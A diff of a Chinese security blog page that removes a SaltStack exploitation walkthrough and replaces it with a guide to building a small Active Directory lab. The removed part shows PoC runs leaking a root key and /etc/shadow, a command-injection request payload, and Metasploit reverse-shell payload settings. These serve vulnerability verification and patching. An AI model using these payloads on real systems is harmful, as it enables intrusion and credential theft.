@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>SaltStack | Mr.Frame</title>
+  <title>AD域环境搭建 | Mr.Frame</title>
   <meta name="keywords" content="">
-  <meta name="description" content="SaltStack | Mr.Frame">
+  <meta name="description" content="AD域环境搭建 | Mr.Frame">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="404 Not Found: 该页面无法显示很抱歉，您所访问的地址并不存在!!!">
 <meta property="og:type" content="website">
@@ -935,34 +935,24 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-SaltStack" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="page-" class="article article-type-page" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">SaltStack</h1>
+        <h1 class="article-title">AD域环境搭建</h1>
     
     <div class="article-meta">
         
         
-        
-        <span class="book">
-            <i class="iconfont icon-category"></i>
-            
-            
-            <a  data-rel="Kali">Kali</a> > 
-            
-            <a  data-rel="Kali&lt;---&gt;Exploit">Exploit</a>
-            
-        </span>
         
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2020-12-04 20:23:00'>2020-12-04 20:23</time>
+            Created At : <time class="date" title='Updated At: 2022-02-05 18:15:20'>2022-02-05 18:15</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:1.1k</span>
+        <span>Count:300</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -992,7 +982,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SaltStack%E6%B0%B4%E5%B9%B3%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2020-11651"><span class="toc-text">SaltStack水平权限绕过漏洞 CVE-2020-11651</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2020-11651-poc%E9%AA%8C%E8%AF%81"><span class="toc-text">CVE-2020-11651-poc验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">MSF漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SaltStack%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-CVE-2020-11652"><span class="toc-text">SaltStack任意文件读取 CVE-2020-11652</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2020-11651-poc%E5%B7%A5%E5%85%B7%E9%AA%8C%E8%AF%81"><span class="toc-text">CVE-2020-11651-poc工具验证</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SaltStack%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2020-16846"><span class="toc-text">SaltStack命令注入漏洞 CVE-2020-16846</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BurpSuite%E5%A4%8D%E6%B5%8B"><span class="toc-text">BurpSuite复测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF%E5%A4%8D%E6%B5%8B"><span class="toc-text">MSF复测</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#AD%E5%B0%8F%E5%9E%8B%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">AD小型域环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9C%A8Winserver%E9%83%A8%E7%BD%B2-Active-Directory%E5%9F%9F%E6%9C%8D%E5%8A%A1"><span class="toc-text">在Winserver部署 Active Directory域服务</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9B%B4%E6%94%B9%E6%9C%AC%E5%9C%B0DNS%E6%8C%87%E5%90%91%E6%9C%AC%E6%9C%BA%E5%9C%B0%E5%9D%80"><span class="toc-text">更改本地DNS指向本机地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%83%A8%E7%BD%B2Active-Directory%E5%9F%9F%E6%9C%8D%E5%8A%A1"><span class="toc-text">部署Active Directory域服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%85%8D%E7%BD%AEActive-Directory%E5%9F%9F%E6%9C%8D%E5%8A%A1"><span class="toc-text">配置Active Directory域服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E5%9F%9F%E7%94%A8%E6%88%B7"><span class="toc-text">添加域用户</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E5%9F%9F%E6%88%90%E5%91%98%E6%9C%BA"><span class="toc-text">添加域成员机</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9B%B4%E6%94%B9DNS%E6%8C%87%E5%90%91%E5%9F%9F%E6%8E%A7-10-211-55-5"><span class="toc-text">更改DNS指向域控 10.211.55.5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#win7-10-%E5%85%A5-%E5%87%BA%E5%9F%9F%E6%93%8D%E4%BD%9C"><span class="toc-text">win7&#x2F;10 入&#x2F;出域操作</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1008,120 +998,54 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>SaltStack 是基于 Python 开发的一套C/S架构配置管理工具,是一个服务器基础架构集中化管理平台，具备配置管理，远程执行，监控等功能。</p>
+        <p>编写进度</p>
 <ul>
-<li><code>4505/4506</code> SaltStack Master与minions通信的端口</li>
-<li><code>8000</code> 这是Salt的API端口,需要通过https访问</li>
+<li><input checked="" disabled="" type="checkbox"> </li>
 </ul>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><pre><code> nmap -Pn -T4  -sV -p 4505,4506,8000 192.168.79.28
-Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times will be slower.
-Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-16 12:30 CST
-Nmap scan report for 192.168.79.28
-Host is up (0.00021s latency).
-
-PORT     STATE SERVICE  VERSION
-4505/tcp open  zmtp     ZeroMQ ZMTP 2.0
-4506/tcp open  zmtp     ZeroMQ ZMTP 2.0
-8000/tcp open  ssl/http CherryPy wsgiserver
-</code></pre>
-<h2 id="SaltStack水平权限绕过漏洞-CVE-2020-11651"><a href="#SaltStack水平权限绕过漏洞-CVE-2020-11651" class="headerlink" title="SaltStack水平权限绕过漏洞 CVE-2020-11651"></a>SaltStack水平权限绕过漏洞 CVE-2020-11651</h2><hr>
-<p>在 CVE-2020-11651 认证绕过漏洞中，<br>      攻击者通过构造恶意请求，<br>                 可以绕过 Salt Master 的验证逻辑，<br>                  调用相关未授权函数功能，<br>从而可以造成远程命令执行漏洞。</p>
-<p>影响版本：</p>
+<h1 id="AD小型域环境搭建"><a href="#AD小型域环境搭建" class="headerlink" title="AD小型域环境搭建"></a>AD小型域环境搭建</h1><p>参考<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/lsIyKJXjywh83btdz186Vw">快速搭建精简的小型域环境</a></p>
 <ul>
-<li>SaltStack &lt; 2019.2.4</li>
-<li>SaltStack &lt; 3000.2</li>
+<li>WinServer 2016     10.211.55.5  (DC)</li>
+<li>Win7 专业版           10.211.55.6</li>
+<li>Win10 专业版         10.211.55.3</li>
 </ul>
-<h3 id="CVE-2020-11651-poc验证"><a href="#CVE-2020-11651-poc验证" class="headerlink" title="CVE-2020-11651-poc验证"></a><a target="_blank" rel="noopener" href="https://github.com/askDing/CVE-2020-11651-poc">CVE-2020-11651-poc</a>验证</h3><pre><code>root@kalimah:~/salt# python3 exploit.py --master 192.168.115.130
-[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
-[+] Salt version: 3000.1
-[ ] This version of salt is vulnerable! Check results below
-[+] Checking salt-master (192.168.115.130:4506) status... ONLINE
-[+] Checking if vulnerable to CVE-2020-11651...
-[*] root key obtained: b5pKEa3Mbp/TD7TjdtUTLxnk0LIANRZXC+9XFNIChUr6ZwIrBZJtoZZ8plfiVx2ztcVxjK2E1OA=
-root@kalimah:~/salt#</code></pre>
-<h3 id="MSF漏洞利用"><a href="#MSF漏洞利用" class="headerlink" title="MSF漏洞利用"></a>MSF漏洞利用</h3><pre><code>Module options (exploit/linux/misc/saltstack_salt_unauth_rce):
-
-   Name      Current Setting  Required  Description
-   ----      ---------------  --------  -----------
-   MINIONS   .*               yes       PCRE regex of minions to target
-   RHOSTS    10.190.26.13     yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
-   ROOT_KEY                   no        Master&#39;s root key if you have it
-   RPORT     4506             yes       The target port (TCP)
-   SRVHOST   0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
-   SRVPORT   8080             yes       The local port to listen on.
-   SSL       false            no        Negotiate SSL for incoming connections
-   SSLCert                    no        Path to a custom SSL certificate (default is randomly generated)
-   URIPATH                    no        The URI to use for this exploit (default is random)
-
-
-Payload options (python/meterpreter/reverse_https):
-
-   Name   Current Setting  Required  Description
-   ----   ---------------  --------  -----------
-   LHOST  192.168.79.28    yes       The local listener hostname
-   LPORT  8443             yes       The local listener port
-   LURI                    no        The HTTP Path</code></pre>
-<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><ul>
-<li>SaltStack官方已发布最新版本修复了上述漏洞，建议相关用户及时更新规避风险。<a target="_blank" rel="noopener" href="https://github.com/saltstack/salt/releases">https://github.com/saltstack/salt/releases</a></li>
-<li>禁止将Salt Master默认监听端口（4505、4506）向公网开放，并设置为仅对可信对象开放。</li>
+<h1 id="在Winserver部署-Active-Directory域服务"><a href="#在Winserver部署-Active-Directory域服务" class="headerlink" title="在Winserver部署 Active Directory域服务"></a>在Winserver部署 <code>Active Directory域服务</code></h1><h2 id="更改本地DNS指向本机地址"><a href="#更改本地DNS指向本机地址" class="headerlink" title="更改本地DNS指向本机地址"></a>更改本地DNS指向本机地址</h2><pre><code class="powershell"># 设置静态ip
+netsh interface ip set addr &quot;本地连接&quot; static 192.168.0.1 255.255.255.0 192.168.0.254 1
+netsh interface ip set dns &quot;本地连接&quot; static 202.103.24.68
+netsh interface ip add dns &quot;本地连接&quot; 10.211.55.5
+# 设置动态ip
+netsh interface ip set addr &quot;本地连接&quot; dhcp
+netsh interface ip set dns &quot;本地连接&quot; dhcp</code></pre>
+<p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/202109300955989AD_DNS.png"></p>
+<h2 id="部署Active-Directory域服务"><a href="#部署Active-Directory域服务" class="headerlink" title="部署Active Directory域服务"></a>部署Active Directory域服务</h2><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/202109301046684add_ad.png"></p>
+<h2 id="配置Active-Directory域服务"><a href="#配置Active-Directory域服务" class="headerlink" title="配置Active Directory域服务"></a>配置Active Directory域服务</h2><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/202109301036336ad_conf.png"></p>
+<p>⚠️ 指定与控制功能时，不能选择 <strong>只读域控制器(RODC)</strong></p>
+<h2 id="添加域用户"><a href="#添加域用户" class="headerlink" title="添加域用户"></a>添加域用户</h2><ul>
+<li>zhangsan    qwe@123</li>
+<li>lisi               qwe@123</li>
 </ul>
-<p>[参考]<br><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/saltstack/CVE-2020-11651">SaltStack认证绕过漏洞</a><br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/k2ClnCQdBi0FoId7hrRQNw">SaltStack认证绕过</a></p>
-<h2 id="SaltStack任意文件读取-CVE-2020-11652"><a href="#SaltStack任意文件读取-CVE-2020-11652" class="headerlink" title="SaltStack任意文件读取 CVE-2020-11652"></a>SaltStack任意文件读取 CVE-2020-11652</h2><p>攻击者可构造恶意请求，读取，写入服务器上任意文件</p>
-<h3 id="CVE-2020-11651-poc工具验证"><a href="#CVE-2020-11651-poc工具验证" class="headerlink" title="CVE-2020-11651-poc工具验证"></a><a target="_blank" rel="noopener" href="https://github.com/askDing/CVE-2020-11651-poc">CVE-2020-11651-poc</a>工具验证</h3><p><a target="_blank" rel="noopener" href="https://github.com/askDing/salt-security-backports.git">salt-securiy-backports</a><br>也可验证</p>
-<pre><code>root@kalimah:~/salt# python2 exploit.py --master 192.168.115.130 -r /etc/shadow
-[+] Salt version: 2019.2.0
-[ ] This version of salt is vulnerable! Check results below
-[+] Checking salt-master (192.168.115.130:4506) status... ONLINE
-[+] Checking if vulnerable to CVE-2020-11651...
-[*] root key obtained: GkJiProN36+iZ53buhvhm3dWcC/7BZyEomu3lSFucQF9TkrCRfA32EIFAk/yyQMkCyqZyxjjp/E=
-[+] Attemping to read /etc/shadow from 192.168.115.130
-root:$6$7qfolaa/$3yhszWj/VUJjfPaqr1yO6NLgV/FhHnVT9Pr6spwJ/F0BJw5vFM.3KjtwcnnuGo5uSJJkLrd28jXrmVZUD9nEI/:17812:0:99999:7:::
-daemon:*:17785:0:99999:7:::
-bin:*:17785:0:99999:7:::
-sys:*:17785:0:99999:7:::
-sync:*:17785:0:99999:7:::
-games:*:17785:0:99999:7:::
-man:*:17785:0:99999:7:::
-[...]</code></pre>
-<h2 id="SaltStack命令注入漏洞-CVE-2020-16846"><a href="#SaltStack命令注入漏洞-CVE-2020-16846" class="headerlink" title="SaltStack命令注入漏洞 CVE-2020-16846"></a>SaltStack命令注入漏洞 CVE-2020-16846</h2><p>2020年11月SaltStack官方披露了CVE-2020-16846和CVE-2020-25592两个漏洞，<br>其中CVE-2020-25592允许任意用户调用SSH模块，<br>CVE-2020-16846允许用户执行任意命令。<br>组合这两个漏洞，将可以使未授权的攻击者通过Salt API执行任意命令。</p>
-<h3 id="BurpSuite复测"><a href="#BurpSuite复测" class="headerlink" title="BurpSuite复测"></a>BurpSuite复测</h3><pre><code>POST /run HTTP/1.1
-Host: 127.0.0.1:8000
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:68.0) Gecko/20100101 Firefox/68.0
-Accept: application/x-yaml
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-DNT: 1
-Connection: close
-Upgrade-Insecure-Requests: 1
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 87
-
-token=12312&amp;client=ssh&amp;tgt=*&amp;fun=a&amp;roster=whip1ash&amp;ssh_priv=aaa|touch%20/tmp/success%3b
-</code></pre>
-<p><img src="../images/saltstack-1.png" alt="saltstack-1"></p>
-<h3 id="MSF复测"><a href="#MSF复测" class="headerlink" title="MSF复测"></a>MSF复测</h3><pre><code>
-Module options (exploit/linux/http/saltstack_salt_api_cmd_exec):
-
-   Name       Current Setting  Required  Description
-   ----       ---------------  --------  -----------
-   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
-   RHOSTS     10.190.75.23     yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
-   RPORT      8000             yes       The target port (TCP)
-   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
-   SRVPORT    8080             yes       The local port to listen on.
-   SSL        true             no        Negotiate SSL/TLS for outgoing connections
-   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
-   TARGETURI  /                yes       Base path
-   URIPATH                     no        The URI to use for this exploit (default is random)
-   VHOST                       no        HTTP server virtual host
-
-
-Payload options (cmd/unix/reverse_python_ssl):
-
-   Name   Current Setting  Required  Description
-   ----   ---------------  --------  -----------
-   LHOST  192.168.79.28    yes       The listen address (an interface may be specified)
-   LPORT  4444             yes       The listen port</code></pre>
+<p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/202109301140291ad_user.png"></p>
+<p>验证是否安装成功</p>
+<p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/202109301142454ad_nettime.png"></p>
+<h1 id="添加域成员机"><a href="#添加域成员机" class="headerlink" title="添加域成员机"></a>添加域成员机</h1><h2 id="更改DNS指向域控-10-211-55-5"><a href="#更改DNS指向域控-10-211-55-5" class="headerlink" title="更改DNS指向域控 10.211.55.5"></a>更改DNS指向域控 <code>10.211.55.5</code></h2><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/202109301148913add_dns.png"></p>
+<p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/202109301154047ad_dns.png"></p>
+<h2 id="win7-10-入-出域操作"><a href="#win7-10-入-出域操作" class="headerlink" title="win7/10 入/出域操作"></a>win7/10 入/出域操作</h2><ul>
+<li><p>powershell(管理员)</p>
+<p>打开powershell</p>
+</li>
+</ul>
+<pre><code class="shell">hostname    # 查看当前主机名
+rename-computer -NewName win10    # win10 更改NetBIOS名
+add-computer -domain &quot;域名&quot; -cred &quot;域名\授权用户&quot; -passthru  ;restart-computer
+remove-computer -credential &quot;域名\授权用户&quot; -passthru -verbose; restart-computer</code></pre>
+<p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/202109301226617ad_join.png"></p>
+<p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/202109301236181ad_remuser.png"></p>
+<ul>
+<li><code>win+R</code> 运行 <code>sysdm.cpl</code></li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/202109301249165ad_join.png"></p>
+<p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/202109301251093ad_join.png"></p>
+<p>出域</p>
+<p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/202109301254268ad_remo.png"></p>
 <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 askding@qq.com </span>
